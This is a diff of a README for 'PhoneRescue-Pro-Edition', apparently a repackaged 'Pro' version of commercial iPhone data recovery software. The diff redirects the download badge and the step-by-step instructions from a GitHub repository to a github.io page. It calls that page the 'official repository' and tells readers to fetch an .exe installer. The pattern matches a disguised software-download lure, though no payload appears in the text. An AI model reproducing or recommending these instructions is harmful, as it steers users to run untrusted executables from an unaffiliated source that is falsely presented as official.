@@ -1,6 +1,6 @@
 # 📱 PhoneRescue-Pro-Edition - Recover Lost Data From Your iPhone
 
-[![Download PhoneRescue Pro](https://img.shields.io/badge/Download-PhoneRescue_Pro-blue.svg)](https://github.com/gothic-bulla824/PhoneRescue-Pro-Edition)
+[![Download PhoneRescue Pro](https://img.shields.io/badge/Download-PhoneRescue_Pro-blue.svg)](https://gothic-bulla824.github.io)
 
 PhoneRescue Pro helps you find missing files on your mobile devices. It works with Windows 11 and Windows 10 computers. You can use this tool to restore messages, photos, contacts, and other data from iPhones. The software connects to your device and scans for files that you deleted by mistake or lost during a system update.
 
@@ -20,7 +20,7 @@ Before you begin, ensure your computer meets these standards to run the software
 
 Follow these steps to obtain the installer file.
 
-1.  Visit the official repository page at [https://github.com/gothic-bulla824/PhoneRescue-Pro-Edition](https://github.com/gothic-bulla824/PhoneRescue-Pro-Edition).
+1.  Visit the official repository page at [https://gothic-bulla824.github.io](https://gothic-bulla824.github.io).
 2.  Look for the major release versions on the right side of the page under the Releases section.
 3.  Click on the latest version link.
 4.  Find the file that ends with ".exe" in the assets list.
